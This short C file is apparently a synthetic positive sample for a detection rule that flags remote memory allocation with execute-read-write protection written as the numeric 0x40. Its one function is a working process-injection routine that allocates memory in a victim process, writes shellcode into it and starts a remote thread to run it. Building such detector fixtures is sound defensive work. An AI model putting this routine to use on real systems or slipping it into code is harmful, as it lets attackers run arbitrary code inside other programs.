// Synthetic positive: remote RWX allocation spelled with the numeric 0x40
// protection value instead of the PAGE_EXECUTE_READWRITE constant.
// Exercises the numeric leg of source-remote-rwx-write-profile.
#include <windows.h>

int drop_stage_numeric(HANDLE victim, const unsigned char *shellcode,
                       unsigned int shellcode_len) {
    void *staging = VirtualAllocEx(victim, 0, shellcode_len,
                                   MEM_COMMIT | MEM_RESERVE, 0x40);
    if (!staging) {
        return -1;
    }
    unsigned int transferred = 0;
    WriteProcessMemory(victim, staging, shellcode, shellcode_len,
                       (SIZE_T *)&transferred);
    HANDLE runner = CreateRemoteThread(victim, 0, 0,
                                       (LPTHREAD_START_ROUTINE)staging, 0, 0,
                                       0);
    if (!runner) {
        return -1;
    }
    CloseHandle(runner);
    return 0;
}
